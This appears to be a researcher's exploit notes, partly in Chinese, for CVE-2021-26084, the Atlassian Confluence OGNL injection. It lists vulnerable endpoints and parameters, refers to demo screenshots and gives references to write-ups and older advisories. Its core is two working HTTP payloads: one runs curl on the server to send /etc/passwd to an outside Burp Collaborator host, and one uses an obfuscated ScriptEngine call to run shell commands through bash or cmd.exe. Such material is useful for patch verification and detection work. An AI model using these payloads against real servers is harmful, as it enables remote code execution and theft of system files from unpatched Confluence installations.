### url
```
URI Path                                   Vulnerable Parameters 
--------------------------------------------------------------------- 
/users/darkfeatures.action                 featureKey 
/users/enabledarkfeature.action            featureKey 
/users/disabledarkfeature.action           featureKey 
/login.action                              token 
/dologin.action                            token 
/signup.action                             token 
/dosignup.action                           token 
/pages/createpage-entervariables.action    queryString, linkCreation 
/pages/doenterpagevariables.action         queryString 
/pages/createpage.action                   queryString 
/pages/createpage-choosetemplate.action    queryString 
/pages/docreatepagefromtemplate.action     queryString 
/pages/docreatepage.action                 queryString 
/pages/createblogpost.action               queryString 
/pages/docreateblogpost.action.            queryString 
/pages/copypage.action                     queryString 
/pages/docopypage.action                   queryString 
/plugins/editor-loader/editor.action       syncRev
```
Ref: https://www.zerodayinitiative.com/blog/2021/9/21/cve-2021-26084-details-on-the-recently-exploited-atlassian-confluence-ognl-injection-bug
其中除两个重要的之外，其他都是需要登录的。


### Payload

```http
POST /pages/createpage-entervariables.action HTTP/1.1
Host: 127.0.0.1:8090
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 215

queryString=lalalala%5cu0027,(linkCreation)(0xd0ff90),%5cu0027lalalala&linkCreation=@java.lang.Runtime@getRuntime().exec('curl -X POST --data-binary @/etc/passwd x.burpcollaborator.net')
```

```http
queryString=aaaaaaaa\u0027%2b{Class.forName(\u0027javax.script.ScriptEngineManager\u0027).newInstance().getEngineByName(\u0027JavaScript\u0027).\u0065val(\u0027var+isWin+%3d+java.lang.System.getProperty(\u0022os.name\u0022).toLowerCase().contains(\u0022win\u0022)%3b+var+cmd+%3d+new+java.lang.String(\u0022ifconfig\u0022)%3bvar+p+%3d+new+java.lang.ProcessBuilder()%3b+if(isWin){p.command(\u0022cmd.exe\u0022,+\u0022/c\u0022,+cmd)%3b+}+else{p.command(\u0022bash\u0022,+\u0022-c\u0022,+cmd)%3b+}p.redirectErrorStream(true)%3b+var+process%3d+p.start()%3b+var+inputStreamReader+%3d+new+java.io.InputStreamReader(process.getInputStream())%3b+var+bufferedReader+%3d+new+java.io.BufferedReader(inputStreamReader)%3b+var+line+%3d+\u0022\u0022%3b+var+output+%3d+\u0022\u0022%3b+while((line+%3d+bufferedReader.readLine())+!%3d+null){output+%3d+output+%2b+line+%2b+java.lang.Character.toString(10)%3b+}\u0027)}%2b\u0027
```


### Demo
![](imgs/WechatIMG4182.png)
![](imgs/WechatIMG4183.png)
![](imgs/WechatIMG4189.png)
![](imgs/WechatIMG4208.png)
![](imgs/WechatIMG4214.png)
![](imgs/WechatIMG4216.png)
![](imgs/WechatIMG4225.png)




### Ref
 - https://github.com/projectdiscovery/nuclei-templates/commit/3a303530427f974dadc69471d3946ace0a776310
 - https://github.com/httpvoid/writeups/blob/main/Confluence-RCE.md
 - https://securitylab.github.com/research/bean-validation-RCE/
 - https://twitter.com/pwntester/status/1433888159083995136
 - https://twitter.com/iamnoooob/status/1431739398782025728
 - [[Atlassian Confluence CVE-2021–26084]::: The other side of bug report!](https://tradahacking.vn/atlassian-confluence-cve-2021-26084-the-other-side-of-bug-bounty-45ed19c814f6)
 - https://bugcrowd.com/disclosures/f76873aa-7acc-4f39-b94d-f066317e7c41/rce-on-confluence-data-center-via-ognl-injection
 - https://www.atlassian.com/blog/rebelutionary/misc/TSS-WebWork2.ppt

### 老漏洞
 - [<= 5.1.4 version OGNL double evaluation in atlassian-xwork](https://confluence.atlassian.com/doc/confluence-security-advisory-2013-08-05-389775711.html)
 - [<= 5.6 version OGNL Double Evaluation Vulnerability](https://confluence.atlassian.com/doc/confluence-security-advisory-2015-01-21-702712783.html)
 - [<= 5.5.1 version ClassLoader Manipulation vulnerability](https://confluence.atlassian.com/doc/confluence-security-advisory-2014-05-21-597557675.html)
